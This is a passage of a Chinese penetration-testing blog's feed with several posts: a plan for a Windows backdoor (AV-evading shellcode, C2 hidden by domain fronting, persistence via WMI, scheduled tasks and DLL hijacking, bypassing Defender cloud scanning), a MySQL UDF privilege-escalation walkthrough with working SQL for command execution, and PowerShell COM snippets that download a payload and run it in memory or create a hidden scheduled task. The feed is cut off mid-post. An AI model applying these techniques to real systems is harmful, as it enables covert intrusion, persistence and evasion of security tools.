    <content type="html"><![CDATA[<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p><ol><li>shellcode的分离免杀</li><li>C2服务器的隐藏</li><li>Windows后门的设置</li></ol><h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p><ol><li>通信: <code>socket</code>,<code>http</code></li><li><code>shellcode</code>的执行方式</li><li><code>shellcode</code>的流量</li><li>远程服务器的隐藏</li></ol><p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p><p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p><p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p><h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4><p>见上一篇的<code>Domain Fronting</code>隐藏HTTPS。</p><p>这个C2的隐藏如果更完美一点的话，可以加上redirector。但是我想了一下，开启CS的时间就是控制利用的那一小段，这里就不折腾了。</p><h4 id="Windows后门的设置"><a href="#Windows后门的设置" class="headerlink" title="Windows后门的设置"></a>Windows后门的设置</h4><p>除去最常见的计划任务，剩下的是一堆注册表，如果存在360之类的话，是比较难处理的。其中有一个<code>WMI</code>，很奇怪各个杀软的拦截都不是太积极。</p><p>在实际测试中，如果留的后门是服务器，那么后门必须是定时启动，如果是个人电脑，那么是在特定的时间内启动。注意这个时间点的设置。</p><p>在Windows上面，最后留下2个以上的后门。一个exe，一个dll劫持，dll劫持我在github上面放了两个方式，推荐使用spooler，因为它默认权限最高，每个电脑都是开机启动。</p><h3 id="后门的形式"><a href="#后门的形式" class="headerlink" title="后门的形式"></a>后门的形式</h3><h4 id="Windows的System权限"><a href="#Windows的System权限" class="headerlink" title="Windows的System权限"></a>Windows的System权限</h4><ul><li>wmi开机启动和定时启动</li><li>计划任务</li><li>spooler的Dll劫持</li></ul><h4 id="Windows的User权限"><a href="#Windows的User权限" class="headerlink" title="Windows的User权限"></a>Windows的User权限</h4><ul><li>msdtc的dll劫持</li></ul><h4 id="Windows的Network权限"><a href="#Windows的Network权限" class="headerlink" title="Windows的Network权限"></a>Windows的Network权限</h4><ul><li>Redis的Dll劫持</li></ul><h4 id="云查杀的绕过"><a href="#云查杀的绕过" class="headerlink" title="云查杀的绕过"></a>云查杀的绕过</h4><p>之前在测试<code>Windows Defender</code>的时候，本来是免杀的exe，跑两三次之后就被杀了。百思不得其解，后来发现是云上传之后被查杀了，观察一下上线云查杀的机器，可以很容易的绕过。</p><p>再往后一点，考虑一下如果每个机器上线都是你动手来做的话，那么可以考虑写一个程序，为每一个被放后门的电脑生成一个唯一的hash值，这个hash值存放在shellcode加载服务器上面，shellcode执行之前先检查是否在数据库里面，这样是不是更完美的方式?</p><h3 id="后门的进阶"><a href="#后门的进阶" class="headerlink" title="后门的进阶"></a>后门的进阶</h3><ul><li><code>AES</code>动态加解密</li><li><code>Domain Fronting</code>隐藏存放<code>shellcode</code> </li><li><code>Domain Fronting</code>隐藏<code>C2</code> </li><li><code>shellcode</code>免杀的执行方式</li></ul><p>参考资料:</p><ul><li><a href="https://uknowsec.cn/posts/notes/ShellCode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">https://uknowsec.cn/posts/notes/ShellCode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;后门的构成&quot;&gt;&lt;a href=&quot;#后门的构成&quot; class=&quot;headerlink&quot; title=&quot;后门的构成&quot;&gt;&lt;/a&gt;后门的构成&lt;/h3&gt;&lt;p&gt;分为三个部分:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;shellcode的分离免杀&lt;/li&gt;
&lt;li&gt;C2服务器的隐藏&lt;/li&gt;
&lt;li&gt;Windows后门的设置&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;分离免杀&quot;&gt;&lt;a href=&quot;#分离免杀&quot; class=&quot;headerlink&quot; title=&quot;分离免杀&quot;&gt;&lt;/a&gt;分离免杀&lt;/h3&gt;&lt;p&gt;shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通信: &lt;code&gt;socket&lt;/code&gt;,&lt;code&gt;http&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shellcode&lt;/code&gt;的执行方式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shellcode&lt;/code&gt;的流量&lt;/li&gt;
&lt;li&gt;远程服务器的隐藏&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用&lt;code&gt;Domain Fronting&lt;/code&gt;隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。&lt;/p&gt;
&lt;p&gt;在参考资料里面,&lt;code&gt;uknownsec&lt;/code&gt;已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。&lt;/p&gt;
&lt;p&gt;其中服务端出去python的功能之外，可以给自己加上一个&lt;code&gt;slack&lt;/code&gt;机器人的通知，这样子上线的时候就有通知。&lt;/p&gt;
&lt;h4 id=&quot;C2服务器的隐藏&quot;&gt;&lt;a href=&quot;#C2服务器的隐藏&quot; class=&quot;headerlink&quot; title=&quot;C2服务器的隐藏&quot;&gt;&lt;/a&gt;C2服务器的隐藏&lt;/h4&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>MySql UDF提权注意事项</title>
    <link href="https://jkme.github.io/2020/07/29/mysql-UDF.html"/>
    <id>https://jkme.github.io/2020/07/29/mysql-UDF.html</id>
    <published>2020-07-28T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.931Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>[mysql-udf-exploitation]<a href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p></blockquote><h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p><pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>结果如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>+----------------------+---------------------------+<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>+----------------------+---------------------------+<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>+----------------------+---------------------------+MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>+-------------------------+--------+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>+-------------------------+--------+<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span><span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>+-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p><p>可以在开启mysql的时候设置plugin的目录:</p><pre class="line-numbers language-none"><code class="language-none">指定目录:mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\指定配置文件:mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini配置文件包括如下内容:[mysqld]plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p><ul><li>@@datadir</li><li>@@basedir\bin</li><li>C:\windows</li><li>C:\windows\system</li><li>C:\windows\system32</li></ul><h3 id="上传UDF的文件"><a href="#上传UDF的文件" class="headerlink" title="上传UDF的文件"></a>上传UDF的文件</h3><h4 id="0x01-网络共享写文件"><a href="#0x01-网络共享写文件" class="headerlink" title="0x01 网络共享写文件"></a>0x01 网络共享写文件</h4><pre class="line-numbers language-none"><code class="language-none">select load_file(&#39;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#39;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="0x02-十六进制"><a href="#0x02-十六进制" class="headerlink" title="0x02 十六进制"></a>0x02 十六进制</h4><pre class="line-numbers language-none"><code class="language-none">xxd -plain &#x2F;tmp&#x2F;udf.dll | tr -d &#39;\n&#39; &gt; &#x2F;tmp&#x2F;dll.hex 转换为16进制use mysql;set @a&#x3D;concat(&#39;&#39;, 0x&lt;hex_of_exe&gt;);create table tmp(data LONGBLOB);insert into tmp values(&quot;&quot;);update tmp set data &#x3D; @a;select data from tmp into DUMPFILE &lt;dir&gt;;create function sys_eval returns string soname &#39;sys_eval.dll&#39;;drop table tmp;drop function sys_eval; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x03-网络共享-16进制"><a href="#0x03-网络共享-16进制" class="headerlink" title="0x03 网络共享+16进制"></a>0x03 网络共享+16进制</h4><pre class="line-numbers language-none"><code class="language-none">load data infile &#39;\\\\192.168.0.19\\network\\udf.hex&#39; into table temp fields terminated by &#39;@OsandaMalith&#39; lines terminated by &#39;@OsandaMalith&#39; (data);select unhex(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x04-base64写入"><a href="#0x04-base64写入" class="headerlink" title="0x04 base64写入"></a>0x04 base64写入</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;先转换为base64;select to_base64(load_file(&#39;&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.dll&#39;)) into dumpfile &#39;&#x2F;tmp&#x2F;udf.b64&#39;;&#x2F;&#x2F;再写入:select from_base64(&quot;TVqQAAMAAAAEAAAAA&quot;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;或者写入到大表里面，再写入到文件:select from_base64(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>msf自带的udf提供的几个函数，主要用到的是<code>sys_eval</code>和<code>sys_exec</code>,实测<code>sys_exec</code>会把mysql崩溃，可能创建的时候返回了string，建议使用<code>sys_eval</code>:</p><h4 id="sys-exec"><a href="#sys-exec" class="headerlink" title="sys_exec"></a>sys_exec</h4><pre class="line-numbers language-none"><code class="language-none">创建函数:create function sys_exec returns int soname &#39;udf.dll&#39;;确定是否成功:select * from mysql.func where name &#x3D; &#39;sys_exec&#39;;删除函数:drop function sys_exec;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sys-eval"><a href="#sys-eval" class="headerlink" title="sys_eval"></a>sys_eval</h4><pre class="line-numbers language-none"><code class="language-none">创建函数:create function sys_eval returns string soname &#39;udf.dll&#39;;确定是否成功:select * from mysql.func where name &#x3D; &#39;sys_eval&#39;;删除:drop function sys_eval;使用:select sys_eval(&#39;dir&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sys-get"><a href="#sys-get" class="headerlink" title="sys_get"></a>sys_get</h4><pre class="line-numbers language-none"><code class="language-none">create function sys_get returns string soname &#39;udf.dll&#39;;Drop function sys_get;&#x2F;&#x2F;获取环境变量Select sys_get(&#39;longonserver&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>I noticed that these external UDF functions do not have proper exception handling in the dissembled code. Hence, a slightest mistake while calling these functions will lead the mysqld.exe server to crash. I hope this article might be useful to you while pentesting MySQL.</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;[mysql-udf-exploitation]&lt;a href=&quot;https://osandamalith.com/2018/02/11/mysql-udf-exploitation&quot;&gt;https://osandamalith.com/2018/02/11/mysql-udf-exploitation&lt;/a&gt;&lt;br&gt;MSF的dll: &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql&quot;&gt;https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x01-准备工作&quot;&gt;&lt;a href=&quot;#0x01-准备工作&quot; class=&quot;headerlink&quot; title=&quot;0x01 准备工作&quot;&gt;&lt;/a&gt;0x01 准备工作&lt;/h3&gt;&lt;p&gt;先检查运行的mysql结构:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;select @@version_compile_os, @@version_compile_machine;
show variables like &amp;#39;%compile%&amp;#39;;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果如下:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;MySQL &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;none&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;select&lt;/span&gt; @@version_compile_os, @@version_compile_machine&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+----------------------+---------------------------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; @@version_compile_os &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; @@version_compile_machine &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+----------------------+---------------------------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Win64                &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; x86_64                    &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+----------------------+---------------------------+
MySQL &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;none&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; show variables like &lt;span class=&quot;token string&quot;&gt;&#39;%compile%&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+-------------------------+--------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Variable_name           &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Value  &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+-------------------------+--------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; version_compile_machine &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; x86_64 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; version_compile_os      &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Win64  &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+-------------------------+--------+&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在&lt;code&gt;Mysql 5.0.67&lt;/code&gt;版本开始，UDF的文件必须放在mysql的插件目录: &lt;code&gt;select @@plugin_dir;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以在开启mysql的时候设置plugin的目录:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;指定目录:
mysqld.exe –plugin-dir&amp;#x3D;C:\\temp\\plugins\\

指定配置文件:
mysqld.exe --defaults-file&amp;#x3D;C:\\temp\\my.ini

配置文件包括如下内容:
[mysqld]
plugin_dir &amp;#x3D; C:\\temp\\plugins\\&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;老版本的Mysql搜索UDF路径是按照如下的顺序来的:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Com Object</title>
    <link href="https://jkme.github.io/2020/07/16/Com-Object-Pentest-Note2.html"/>
    <id>https://jkme.github.io/2020/07/16/Com-Object-Pentest-Note2.html</id>
    <published>2020-07-15T16:00:00.000Z</published>
    <updated>2022-01-21T02:42:15.697Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p></blockquote><p>我就瞎写了:</p><p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p><h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))$Instance.Connect()$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)$Task &#x3D; $Instance.NewTask(0)$Trigger &#x3D; $Task.triggers.Create(0)$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;$Trigger.Enabled &#x3D; $True$Trigger.Id &#x3D; $Taskname$Action &#x3D; $Task.Actions.Create(0)$Action.Path &#x3D; “cmd.exe”$Action.Arguments &#x3D; “&#x2F;c whoami”$Action.HideAppWindow &#x3D; $True$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)function Convert-Date &#123;               param(             [datetime]$Date        )               PROCESS &#123;               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;        &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我就瞎写了:&lt;/p&gt;
&lt;p&gt;COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。&lt;/p&gt;
&lt;h3 id=&quot;文件下载&quot;&gt;&lt;a href=&quot;#文件下载&quot; class=&quot;headerlink&quot; title=&quot;文件下载&quot;&gt;&lt;/a&gt;文件下载&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Powershell无文件落地执行
$o &amp;#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&amp;quot;F5078F35-C551-11D3-89B9-0000F81FE221&amp;quot;)); $o.Open(&amp;quot;GET&amp;quot;, &amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;payload&amp;quot;, $False); $o.Send(); IEX $o.responseText;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;下载文件,如果需要下载exe，转换成hex或者base64，再编码
powershell -Command &amp;quot;$o &amp;#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&amp;quot;F5078F35-C551-11D3-89B9-0000F81FE221\&amp;quot;)); $o.Open(\&amp;quot;GET\&amp;quot;, \&amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;payload\&amp;quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;定时任务&quot;&gt;&lt;a href=&quot;#定时任务&quot; class=&quot;headerlink&quot; title=&quot;定时任务&quot;&gt;&lt;/a&gt;定时任务&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;$TaskName &amp;#x3D; [Guid]::NewGuid().ToString()
$Instance &amp;#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&amp;quot;Schedule.Service&amp;quot;))
$Instance.Connect()
$Folder &amp;#x3D; $Instance.GetFolder(&amp;quot;\&amp;quot;)
$Task &amp;#x3D; $Instance.NewTask(0)
$Trigger &amp;#x3D; $Task.triggers.Create(0)
$Trigger.StartBoundary &amp;#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
$Trigger.EndBoundary &amp;#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
$Trigger.ExecutionTimelimit &amp;#x3D; &amp;quot;PT5M&amp;quot;
$Trigger.Enabled &amp;#x3D; $True
$Trigger.Id &amp;#x3D; $Taskname
$Action &amp;#x3D; $Task.Actions.Create(0)
$Action.Path &amp;#x3D; “cmd.exe”
$Action.Arguments &amp;#x3D; “&amp;#x2F;c whoami”
$Action.HideAppWindow &amp;#x3D; $True
$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &amp;quot;&amp;quot;, &amp;quot;&amp;quot;, 3)

function Convert-Date &amp;#123;       

        param(
             [datetime]$Date

        )       

        PROCESS &amp;#123;
               $Date.Touniversaltime().tostring(&amp;quot;u&amp;quot;) -replace &amp;quot; &amp;quot;,&amp;quot;T&amp;quot;
        &amp;#125;
&amp;#125;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html&quot;&gt;https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透流水账</title>
    <link href="https://jkme.github.io/2020/05/14/workgroup-pentest2.html"/>
    <id>https://jkme.github.io/2020/05/14/workgroup-pentest2.html</id>
    <published>2020-05-13T16:00:00.000Z</published>
    <updated>2022-01-21T03:25:13.534Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><ol><li>Linux主机www权限</li><li>主机无法出外网</li><li>正向代理无法使用</li><li>B段内网</li></ol><h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>#####F-Scrack.py</p><pre class="line-numbers language-none"><code class="language-none">获取Redis, ES等PS: Scrack.py的mssql模块爆破不准确，可以自己写一个简单的python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>key较多的时候不要使用<code>keys *</code></p><pre class="line-numbers language-none"><code class="language-none">查看基本信息: master，数量，版本号使用scan查看keys: scan 0 match * count 100 查看类型: type &lt;key&gt;hash类型: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MySQL"><a href="#MySQL" 